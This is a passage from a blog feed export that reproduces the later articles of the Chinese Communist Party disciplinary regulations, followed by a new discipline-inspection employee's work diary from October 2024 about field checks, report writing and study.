<p>  <strong>第九十三条</strong>　驻外机构或者临时出国（境）团（组）中的党员，脱离组织出走时间不满六个月又自动回归的，给予撤销党内职务或者留党察看处分；脱离组织出走时间超过六个月的，按照自行脱党处理，党内予以除名。</p>
<p>  故意为他人脱离组织出走提供方便条件的，给予警告、严重警告或者撤销党内职务处分。</p>
<h3 id="第八章-对违反廉洁纪律行为的处分"><a href="#第八章-对违反廉洁纪律行为的处分" class="headerlink" title="第八章　对违反廉洁纪律行为的处分"></a>第八章　对违反廉洁纪律行为的处分</h3><p>  <strong>第九十四条</strong>　党员干部必须正确行使人民赋予的权力，清正廉洁，反对特权思想和特权现象，反对任何滥用职权、谋求私利的行为。</p>
<p>  利用职权或者职务上的影响为他人谋取利益，本人的配偶、子女及其配偶等亲属和其他特定关系人收受对方财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第九十五条</strong>　相互利用职权或者职务上的影响为对方及其配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人谋取利益搞权权交易的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第九十六条</strong>　纵容、默许配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人利用党员干部本人职权或者职务上的影响谋取私利，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  党员干部的配偶、子女及其配偶等亲属和其他特定关系人不实际工作而获取薪酬或者虽实际工作但领取明显超出同职级标准薪酬，党员干部知情未予纠正的，依照前款规定处理。</p>
<p>  <strong>第九十七条</strong>　收受可能影响公正执行公务的礼品、礼金、消费卡（券）和有价证券、股权、其他金融产品等财物，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  收受其他明显超出正常礼尚往来的财物的，依照前款规定处理。</p>
<p>  <strong>第九十八条</strong>　向从事公务的人员及其配偶、子女及其配偶等亲属和其他特定关系人赠送明显超出正常礼尚往来的礼品、礼金、消费卡（券）和有价证券、股权、其他金融产品等财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  以讲课费、课题费、咨询费等名义变相送礼的，依照前款规定处理。</p>
<p>  <strong>第九十九条</strong>　借用管理和服务对象的钱款、住房、车辆等，可能影响公正执行公务，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  通过民间借贷等金融活动获取大额回报，可能影响公正执行公务的，依照前款规定处理。</p>
<p>  <strong>第一百条</strong>　利用职权或者职务上的影响操办婚丧喜庆事宜，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分；借机敛财或者有其他侵犯国家、集体和人民利益行为的，从重或者加重处分，直至开除党籍。</p>
<p>  <strong>第一百零一条</strong>　接受、提供可能影响公正执行公务的宴请或者旅游、健身、娱乐等活动安排，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百零二条</strong>　违反有关规定取得、持有、实际使用运动健身卡、会所和俱乐部会员卡、高尔夫球卡等各种消费卡（券），或者违反有关规定出入私人会所，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百零三条</strong>　违反有关规定从事营利活动，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）经商办企业；</p>
<p>  （二）拥有非上市公司（企业）的股份或者证券；</p>
<p>  （三）买卖股票或者进行其他证券投资；</p>
<p>  （四）从事有偿中介活动；</p>
<p>  （五）在国（境）外注册公司或者投资入股；</p>
<p>  （六）其他违反有关规定从事营利活动的行为。</p>
<p>  利用参与企业重组改制、定向增发、兼并投资、土地使用权出让等工作中掌握的信息买卖股票，利用职权或者职务上的影响通过购买信托产品、基金等方式非正常获利的，依照前款规定处理。</p>
<p>  违反有关规定在经济组织、社会组织等单位中兼职，或者经批准兼职但获取薪酬、奖金、津贴等额外利益的，依照第一款规定处理。</p>
<p>  <strong>第一百零四条</strong>　利用职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人在审批监管、资源开发、金融信贷、大宗采购、土地使用权出让、房地产开发、工程招投标以及公共财政收支等方面谋取利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  利用职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人吸收存款、推销金融产品、经营名贵特产类特殊资源等提供帮助谋取利益的，依照前款规定处理。</p>
<p>  <strong>第一百零五条</strong>　离职或者退（离）休后违反有关规定接受原任职务管辖的地区和业务范围内或者与原工作业务直接相关的企业和中介机构等单位的聘用，或者个人从事与原任职务管辖业务或者与原工作业务直接相关的营利活动，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务处分；情节严重的，给予留党察看处分。</p>
<p>  党员领导干部离职或者退（离）休后违反有关规定担任上市公司、基金管理公司独立董事、独立监事等职务，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务处分；情节严重的，给予留党察看处分。</p>
<p>  <strong>第一百零六条</strong>　离职或者退（离）休后利用原职权或者职务上的影响，为配偶、子女及其配偶等亲属和其他特定关系人从事经营活动谋取利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  离职或者退（离）休后利用原职权或者职务上的影响为他人谋取利益，本人的配偶、子女及其配偶等亲属和其他特定关系人收受对方财物，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第一百零七条</strong>　党员领导干部的配偶、子女及其配偶，违反有关规定在该党员领导干部管辖的地区和业务范围内从事可能影响其公正执行公务的经营活动，或者有其他违反经商办企业禁业规定行为的，该党员领导干部应当按照规定予以纠正；拒不纠正的，其本人应当辞去现任职务或者由组织予以调整职务；不辞去现任职务或者不服从组织调整职务的，给予撤销党内职务处分。</p>
<p>  <strong>第一百零八条</strong>　党和国家机关违反有关规定经商办企业的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百零九条</strong>　党员领导干部违反工作、生活保障制度，在交通、医疗、警卫等方面为本人、配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人谋求特殊待遇，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百一十条</strong>　在分配、购买住房中侵犯国家、集体利益，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百一十一条</strong>　利用职权或者职务上的影响，侵占非本人经管的公私财物，或者以象征性地支付钱款等方式侵占公私财物，或者无偿、象征性地支付报酬接受服务、使用劳务，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  利用职权或者职务上的影响，将应当由本人、配偶、子女及其配偶等亲属、身边工作人员和其他特定关系人个人支付的费用，由下属单位、其他单位或者他人支付、报销的，依照前款规定处理。</p>
<p>  <strong>第一百一十二条</strong>　利用职权或者职务上的影响，违反有关规定占用公物归个人使用，时间超过六个月，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  占用公物进行营利活动的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  将公物借给他人进行营利活动的，依照前款规定处理。</p>
<p>  <strong>第一百一十三条</strong>　违反有关规定组织、参加用公款支付的宴请、娱乐、健身活动，或者用公款购买赠送或者发放礼品、消费卡（券）等，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百一十四条</strong>　违反有关规定自定薪酬或者滥发津贴、补贴、奖金、福利等，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百一十五条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）公款旅游或者以学习培训、考察调研、职工疗养等为名变相公款旅游；</p>
<p>  （二）改变公务行程，借机旅游；</p>
<p>  （三）参加所管理企业、下属单位组织的考察活动，借机旅游。</p>
<p>  以考察、学习、培训、研讨、招商、参展等名义变相用公款出国（境）旅游的，对直接责任者和领导责任者，依照前款规定处理。</p>
<p>  <strong>第一百一十六条</strong>　违反接待管理规定，超标准、超范围接待或者借机大吃大喝，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百一十七条</strong>　违反有关规定配备、购买、更换、装饰、使用公务交通工具或者有其他违反公务交通工具管理规定的行为，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百一十八条</strong>　违反会议活动管理规定，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分：</p>
<p>  （一）到禁止召开会议的风景名胜区开会；</p>
<p>  （二）决定或者批准举办各类节会、庆典活动；</p>
<p>  （三）其他违反会议活动管理规定行为。</p>
<p>  擅自举办评比达标表彰、创建示范活动或者借评比达标表彰、创建示范活动收取费用的，对直接责任者和领导责任者，依照前款规定处理。</p>
<p>  <strong>第一百一十九条</strong>　违反办公用房管理等规定，有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分：</p>
<p>  （一）决定或者批准兴建、装修办公楼、培训中心等楼堂馆所；</p>
<p>  （二）超标准配备、使用办公用房；</p>
<p>  （三）未经批准租用、借用办公用房；</p>
<p>  （四）用公款包租、占用客房或者其他场所供个人使用；</p>
<p>  （五）其他违反办公用房管理等规定行为。</p>
<p>  <strong>第一百二十条</strong>　搞权色交易或者给予财物搞钱色交易的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百二十一条</strong>　有其他违反廉洁纪律规定行为的，应当视具体情节给予警告直至开除党籍处分。</p>
<h3 id="第九章-对违反群众纪律行为的处分"><a href="#第九章-对违反群众纪律行为的处分" class="headerlink" title="第九章　对违反群众纪律行为的处分"></a>第九章　对违反群众纪律行为的处分</h3><p>  <strong>第一百二十二条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）超标准、超范围向群众筹资筹劳、摊派费用，加重群众负担；</p>
<p>  （二）违反有关规定扣留、收缴群众款物或者处罚群众；</p>
<p>  （三）克扣群众财物，或者违反有关规定拖欠群众钱款；</p>
<p>  （四）在管理、服务活动中违反有关规定收取费用；</p>
<p>  （五）在办理涉及群众事务时刁难群众、吃拿卡要；</p>
<p>  （六）其他侵害群众利益行为。</p>
<p>  在乡村振兴领域有上述行为的，从重或者加重处分。</p>
<p>  <strong>第一百二十三条</strong>　干涉生产经营自主权，致使群众财产遭受较大损失的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百二十四条</strong>　在社会保障、社会救助、政策扶持、救灾救济款物分配等事项中优亲厚友、明显有失公平的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百二十五条</strong>　利用宗族或者黑恶势力等欺压群众，或者纵容涉黑涉恶活动、为黑恶势力充当“保护伞”的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百二十六条</strong>　有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p>
<p>  （一）对涉及群众生产、生活等切身利益的问题依照政策或者有关规定能解决而不及时解决，庸懒无为、效率低下，造成不良影响；</p>
<p>  （二）对符合政策的群众诉求消极应付、推诿扯皮，损害党群、干群关系；</p>
<p>  （三）对待群众态度恶劣、简单粗暴，造成不良影响；</p>
<p>  （四）弄虚作假，欺上瞒下，损害群众利益；</p>
<p>  （五）其他不作为、乱作为、慢作为、假作为等损害群众利益行为。</p>
<p>  <strong>第一百二十七条</strong>　遇到国家财产和群众生命财产受到严重威胁时，能救而不救，情节较重的，给予警告、严重警告或者撤销党内职务处分；情节严重的，给予留党察看或者开除党籍处分。</p>
<p>  <strong>第一百二十八条</strong>　不按照规定公开党务、政务、厂务、村（居）务等，侵犯群众知情权，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  <strong>第一百二十九条</strong>　有其他违反群众纪律规定行为的，应当视具体情节给予警告直至开除党籍处分。</p>
<h3 id="第十章-对违反工作纪律行为的处分"><a href="#第十章-对违反工作纪律行为的处分" class="headerlink" title="第十章　对违反工作纪律行为的处分"></a>第十章　对违反工作纪律行为的处分</h3><p>  <strong>第一百三十条</strong>　工作中不负责任或者疏于管理，贯彻执行、检查督促落实上级决策部署不力，给党、国家和人民利益以及公共财产造成较大损失的，对直接责任者和领导责任者，给予警告或者严重警告处分；造成重大损失的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  党员领导干部对于到任前已经存在且属于其职责范围内的问题，消极回避、推卸责任，造成严重损害或者严重不良影响的，依照前款规定处理。</p>
<p>  <strong>第一百三十一条</strong>　工作中不敢斗争、不愿担当，面对重大矛盾冲突、危机困难临阵退缩，造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第一百三十二条</strong>　有下列行为之一，造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）热衷于搞舆论造势、浮在表面；</p>
<p>  （二）单纯以会议贯彻会议、以文件落实文件，在实际工作中不见诸行动；</p>
<p>  （三）脱离实际，不作深入调查研究，搞随意决策、机械执行；</p>
<p>  （四）违反精文减会有关规定搞文山会海；</p>
<p>  （五）在督查检查考核等工作中搞层层加码、过度留痕，增加基层工作负担；</p>
<p>  （六）工作中其他形式主义、官僚主义行为。</p>
<p>  <strong>第一百三十三条</strong>　在公务活动用餐、单位食堂用餐管理工作中不履行或者不正确履行宣传教育、监督管理职责，导致餐饮浪费，造成严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百三十四条</strong>　在机构编制工作中，有下列行为之一，造成不良影响或者严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）擅自超出“三定”规定范围调整职责、设置机构、核定领导职数和配备人员；</p>
<p>  （二）违规干预地方机构设置；</p>
<p>  （三）其他违反机构编制管理规定行为。</p>
<p>  <strong>第一百三十五条</strong>　在信访工作中，有下列行为之一，造成不良影响或者严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）不按照规定受理、办理信访事项；</p>
<p>  （二）对规模性集体访等处置不力，导致事态扩大；</p>
<p>  （三）对党委和政府信访部门提出的改进工作、完善政策等建议重视不够、落实不力，导致问题长期得不到解决；</p>
<p>  （四）其他不履行或者不正确履行信访工作职责行为。</p>
<p>  不履行或者不正确履行职责，导致信访事项发生，造成不良影响或者严重后果的，对直接责任者和领导责任者，依照前款规定处理。</p>
<p>  <strong>第一百三十六条</strong>　党组织有下列行为之一，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分：</p>
<p>  （一）党员被立案审查期间，擅自批准其出差、出国（境）、辞职，或者对其交流、提拔职务、晋升职级、进一步使用、奖励，或者办理退休手续；</p>
<p>  （二）党员被依法追究刑事责任后，不按照规定给予党纪处分，或者对党员违反国家法律法规的行为，应当给予党纪处分而不处分；</p>
<p>  （三）党纪处分决定或者申诉复查决定作出后，不按照规定落实决定中关于被处分人党籍、职务、职级、待遇等事项；</p>
<p>  （四）党员受到党纪处分后，不按照干部管理权限和组织关系对受处分党员开展日常教育、管理和监督工作。</p>
<p>  <strong>第一百三十七条</strong>　滥用问责，或者在问责工作中严重不负责任，造成不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百三十八条</strong>　因工作不负责任致使所管理的人员叛逃的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  因工作不负责任致使所管理的人员出逃、出走，对直接责任者和领导责任者，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百三十九条</strong>　进行统计造假，对直接责任者和领导责任者，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  对统计造假失察，造成严重后果的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p>  <strong>第一百四十条</strong>　在上级检查、视察工作或者向上级汇报、报告工作时对应当报告的事项不报告或者不如实报告，造成严重损害或者严重不良影响的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务或者留党察看处分。</p>
<p>  在上级检查、视察工作或者向上级汇报、报告工作时纵容、唆使、暗示、强迫下级说假话、报假情的，从重或者加重处分。</p>
<p>  <strong>第一百四十一条</strong>　违反有关规定干预和插手市场经济活动，有下列行为之一，情节较轻的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分：</p>
<p>  （一）干预和插手建设工程项目承发包、土地使用权出让、政府采购、房地产开发与经营、矿产资源开发利用、中介机构服务等活动；</p>
<p>  （二）干预和插手国有企业重组改制、兼并、破产、产权交易、清产核资、资产评估、资产转让、重大项目投资以及其他重大经营活动等事项；</p>
<p>  （三）干预和插手批办各类行政许可和资金借贷等事项；</p>
<p>  （四）干预和插手经济纠纷；</p>
<p>  （五）干预和插手集体资金、资产和资源的使用、分配、承包、租赁等事项。</p>
<p>  <strong>第一百四十二条</strong>　违反有关规定干预和插手司法活动、执纪执法活动，向有关地方或者部门打听案情、打招呼、说情，或者以其他方式对司法活动、执纪执法活动施加影响，情节较轻的，给予严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  违反有关规定干预和插手公共财政资金分配、项目立项评审、功勋荣誉表彰奖励等活动，造成重大损失或者不良影响的，依照前款规定处理。</p>
<p>  <strong>第一百四十三条</strong>　按照有关规定对干预和插手行为负有报告和登记义务的受请托人，不按照规定报告或者登记，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百四十四条</strong>　泄露、扩散或者打探、窃取党组织关于干部选拔任用、纪律审查、巡视巡察等尚未公开事项或者其他应当保密的内容的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  私自留存涉及党组织关于干部选拔任用、纪律审查、巡视巡察等方面资料，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百四十五条</strong>　在考试、录取工作中，有泄露试题、考场舞弊、涂改考卷、违规录取等违反有关规定行为的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百四十六条</strong>　以不正当方式谋求本人或者其他人用公款出国（境），情节较轻的，给予警告处分；情节较重的，给予严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p> <strong>第一百四十七条</strong>　临时出国（境）团（组）或者人员中的党员，擅自延长在国（境）外期限，或者擅自变更路线的，对直接责任者和领导责任者，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p><strong>第一百四十八条</strong>　驻外机构或者临时出国（境）团（组）中的党员，触犯驻在国家、地区的法律、法令或者不尊重驻在国家、地区的宗教习俗，情节较重的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务、留党察看或者开除党籍处分。</p>
<p><strong>第一百四十九条</strong>　在党的纪律检查、组织、宣传、统一战线工作以及机关工作等其他工作中，不履行或者不正确履行职责，造成损失或者不良影响的，应当视具体情节给予警告直至开除党籍处分。</p>
<h3 id="第十一章-对违反生活纪律行为的处分"><a href="#第十一章-对违反生活纪律行为的处分" class="headerlink" title="第十一章　对违反生活纪律行为的处分"></a>第十一章　对违反生活纪律行为的处分</h3><p>  <strong>第一百五十条</strong>　生活奢靡、铺张浪费、贪图享乐、追求低级趣味，造成不良影响的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百五十一条</strong>　与他人发生不正当性关系，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  利用职权、教养关系、从属关系或者其他相类似关系与他人发生性关系的，从重处分。</p>
<p>  <strong>第一百五十二条</strong>　党员领导干部不重视家风建设，对配偶、子女及其配偶失管失教，造成不良影响或者严重后果的，给予警告或者严重警告处分；情节严重的，给予撤销党内职务处分。</p>
<p>  <strong>第一百五十三条</strong>　违背社会公序良俗，在公共场所、网络空间有不当言行，造成不良影响的，给予警告或者严重警告处分；情节较重的，给予撤销党内职务或者留党察看处分；情节严重的，给予开除党籍处分。</p>
<p>  <strong>第一百五十四条</strong>　有其他严重违反社会公德、家庭美德行为的，应当视具体情节给予警告直至开除党籍处分。</p>
<h2 id="第三编-附则"><a href="#第三编-附则" class="headerlink" title="第三编　附则"></a>第三编　附则</h2><p>  <strong>第一百五十五条</strong>　各省、自治区、直辖市党委可以根据本条例，结合各自工作的实际情况，制定单项实施规定。</p>
<p>  <strong>第一百五十六条</strong>　中央军事委员会可以根据本条例，结合中国人民解放军和中国人民武装警察部队的实际情况，制定补充规定或者单项规定。</p>
<p>  <strong>第一百五十七条</strong>　本条例由中央纪委负责解释。</p>
<p>  <strong>第一百五十八条</strong>　本条例自2024年1月1日起施行。</p>
<p>  本条例施行前，已结案的案件如需进行复查复议，适用当时的规定或者政策。尚未结案的案件，如果行为发生时的规定或者政策不认为是违纪，而本条例认为是违纪的，依照当时的规定或者政策处理；如果行为发生时的规定或者政策认为是违纪的，依照当时的规定或者政策处理，但是如果本条例不认为是违纪或者处理较轻的，依照本条例规定处理。</p>
]]></content>
      <categories>
        <category>工具书</category>
      </categories>
      <tags>
        <tag>党纪处分</tag>
      </tags>
  </entry>
  <entry>
    <title>工作日志（善学善思考）</title>
    <url>/2024/10/15/%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%BF%97%EF%BC%88%E5%96%84%E5%AD%A6%E5%96%84%E6%80%9D%E8%80%83%EF%BC%89/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>工作日志（善学善思考）</p>
<p>本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！本篇需要密码哦！</p>
<h2 id="2024-10-15"><a href="#2024-10-15" class="headerlink" title="2024.10.15"></a>2024.10.15</h2><p>今天是进入纪委的第一天，我被分配到了派驻县委办，早上八点半，我们这一批在521会议室集合等待与同事们见面，却被张部长单独叫了出去，原来是需要我和两个同事（LYQ和CXY）去跟服务市委三组下乡核实情况。还没有与同事见面就要下乡了？我不仅有些疑惑还有一些兴奋。</p>
<p>去了三组，拿到了审计问题情况表，看了看大致情况，趁领导们商量的时候搜了一下表上的出底板和消力坎是什么东西，ZL姐出发前给我说了大致需要去做什么，我也满怀期待的等着领导给我分配任务。</p>
<p>上午九点，我跟ZL姐去了X村水库，看了看水库的大致情况，ZL姐让我也拍照片记录，于是我分别拍了出底板和消力坎的图片。我问ZL姐我拍的图片咋样，ZL姐拿出她拍的图片，出底板和消力坎在一张图片里，并告诉我这样拍可以看到这两个的情况。我也暗暗记下这个拍照的方法。</p>
<p>之后去了F庄村，主要查看农田灌溉渠的情况，到了现场发现灌溉渠里还是有干了的淤泥沉底，但是不影响灌溉，我积极的拍照片，却看到ZL姐亲自去灌溉渠里用手挖出一块干泥巴看淤泥的厚度，我心里想果然处处留心皆学问。灌溉渠紧邻学校，学校里传出蜗牛与黄鹂鸟的歌，我想我像是一只蜗牛，一步一步地往上爬。</p>
<p>下午就开始整理报告。主要是1.项目基本情况。2.问题及产生原因。3.问题整改措施。4.相关责任追究</p>
<p>之后向郝书记汇报，郝书记考虑的很全面。</p>
<p>1.水毁项目管护不到位：农田灌溉渠是什么时候开始堵的，堵了多久，项目的基本情况，管护职责，灌溉了多少亩农田，区域面积，高标准农田管护员是不是村干部，是不是党员，是什么身份等。</p>
<p>2.水库未按设计图纸施工：当时为什么验收过了、有没有变更手续，责任在谁，业主、施工方、监理方等。</p>
<blockquote>
<p>1.处处留心皆学问。2.凡事都要考虑全面细致。3.沟通的艺术</p>
</blockquote>
<h2 id="2024-10-16"><a href="#2024-10-16" class="headerlink" title="2024.10.16"></a>2024.10.16</h2><p>上午继续整理汇报资料，写文章需要逐字逐句，认真细致，比如市纪委写的是关坡村，下面报上来的资料是官坡村，一个“guan”字就要打电话确认，包括文档中设计的一些规定，要知道是谁发布的，省、市、县还是县水利局。这些工作做完之后，去了组了，见到了HT哥，没有给我分配什么任务，他在整理上交的档案，让我给档案的文件夹写名字。</p>
<p>下午HT哥出去办事，我在组里等创能中心的人，并给我交代做好接待工作，等党风室的人通知。下午创能中心的人没有来，三组喊我去修改文档，回来之后在办公室也没有什么活干，倒腾了一会打印机，会打印和复印了，顺便激活了电脑的系统，HT办完事回来给我说要请假一个月，并带我去楼上见了15监察室Y主任（421）交代了一下。未来一个月组里就剩我自己了，本来刚来认识的人就不多，组里的人都不在，有些忐忑和担忧，听说是组里案件少，不容易接触到办案，因此未来一个月工作我认为还是能够完成的不错的。但是案件少，还是有点担心这一个月干的都是打杂的，学不到东西，没成果，被边缘化。</p>
<blockquote>
<p>写文档要严谨。</p>
</blockquote>
<h2 id="2024-10-17"><a href="#2024-10-17" class="headerlink" title="2024.10.17"></a>2024.10.17</h2><p>上午学习《中国共产党纪律处分条例》（2018、2023年版），可能要开会，S主任会联系。</p>
<p>下午继续学习《中国共产党纪律处分条例》，组里就我自己，开着门看着同事们来来往往，忙忙碌碌，感觉有点格格不入，希望有人来让我干点啥。</p>
<p>下班去食堂吃饭，听到同批的同事都在聊今天干了什么，很多人都接触案件了，感觉很充实。真是旱的旱死，涝的涝死。希望明天能给我分配点任务。同时我也在思考我的核心竞争力是什么，有什么是我独一无二不可替代的。越想越烦。</p>
<blockquote>
<p>有些焦虑吧。</p>
</blockquote>
<h2 id="2024-10-18"><a href="#2024-10-18" class="headerlink" title="2024.10.18"></a>2024.10.18</h2><p>上午填了两张表，日常监督表格注意事项：1.单位名称填写全称，从省开始写；2.调研表方案或者报告全文复制；3.有问题根据政策写，根据xxx，xxx干了xxx。昨晚有同事加班到11点，不知道未来一个月我们组的工作是什么情况。</p>
<p>下午也没有什么事情，就学习业务书籍，感觉同事们都很热心，有什么问题都会热心的解答。甚至下午来的技术人员会从下载浏览器开始教我登录内网基础班平台，哈哈哈，感觉很有意思。</p>
<blockquote>
<p>同事们都很好，人热心。</p>
</blockquote>
<h2 id="2024-10-21"><a href="#2024-10-21" class="headerlink" title="2024.10.21"></a>2024.10.21</h2><p>收以案促改材料。明天去政协开会。</p>
<blockquote>
<p>期待明天的到来。</p>
</blockquote>
<h2 id="2024-10-22"><a href="#2024-10-22" class="headerlink" title="2024.10.22"></a>2024.10.22</h2><p>上午学习二十届三中全会精神，学习《中共中央关于进一步全面深化改革、推进中国式现代化的决定》、《中国共产党第二十届中央委员会第三次全体会议公报》，并写了读后感。</p>
<p>下午去政协开以案促改会议。</p>
<blockquote>
<p>逐步进入正轨，哈哈哈。</p>
</blockquote>
<h2 id="2024-10-23"><a href="#2024-10-23" class="headerlink" title="2024.10.23"></a>2024.10.23</h2><p>上午学习二十届三中全会精神，去党校考试，并且认识了公安局警令部主任，最美基层民警LXG，初心不改，坚守大山，我感觉他们都很伟大，能够真真正正的接触到群众的。</p>
<p>进一步深化改革的总目标：<br>1.继续完善和发展中国特色社会主义制度。<br>2.推进国家治理体系和治理能力现代化。<br>3.到2035年，全面建成高水平社会主义市场经济体制。<br>4.中国特色社会主义制度更加完善。<br>5.基本实现国家治理体系和治理能力现代化。<br>6.基本实现社会主义现代化。</p>
